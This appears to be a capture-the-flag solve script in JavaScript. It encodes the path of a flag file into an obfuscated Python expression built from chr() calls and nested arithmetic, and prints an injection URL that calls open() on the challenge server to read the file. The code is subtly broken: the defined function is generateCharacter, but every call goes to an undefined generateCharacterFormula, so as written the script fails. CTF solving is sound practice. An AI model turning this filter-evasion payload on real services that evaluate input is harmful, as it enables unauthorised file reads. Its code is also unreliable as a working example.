const knownNumbersOrPath = {
    "1": "int()**int()",
    "2": "1+1",
    "4": "2+2",
    "8": "4*2",
    "16": "8*2",
    "32": "16*2",
    "64": "32*2",
    "46": "32+8+4+2",
    "47": "46+1",
    "97": "64+32+1",
    "101": "97+4",
    "102": "101+1",
    "103": "102+1",
    "104": "103+1",
    "105": "104+1",
    "108": "64+32+8+4",
    "109": "108+1",
    "111": "109+2",
    "112": "111+1",
    "115": "111+4",
    "116": "115+1",
    "120": "64+32+16+8",
}

const generateCharacter = (number) => {
    let formula = knownNumbersOrPath[number];
    if (!formula) { 
        // Find all numbers required to generate this number
        const numbers = [];
        let n = number;
        values = Object.keys(knownNumbersOrPath).map((x) => parseInt(x)).sort((a, b) => b - a);
        while (n > 0) {
            for (const value of values) {
                if (value <= n) {
                    n -= value;
                    numbers.push(value);
                    break;
                }
            }
        }

        formula = numbers.join("+");
     }
   
   
    formula = `(${formula})`;

    formula = formula.replace(/\d+/g, (match) => {
        // console.log(`match = ${match}`);
        return generateCharacterFormula(match);
    });

    return formula;
}

const string = "/lol/hemmeligmappe/flagg.txt".split("").map((x) => {
    return "chr("+generateCharacterFormula(x.charCodeAt(0))+")";
});

const fullString = encodeURIComponent(string.join("+"));
console.log(`https://helsectf2024-2da207d37b091b1b4dff-not-cipher.chals.io?program=print(*open(${fullString}))`);
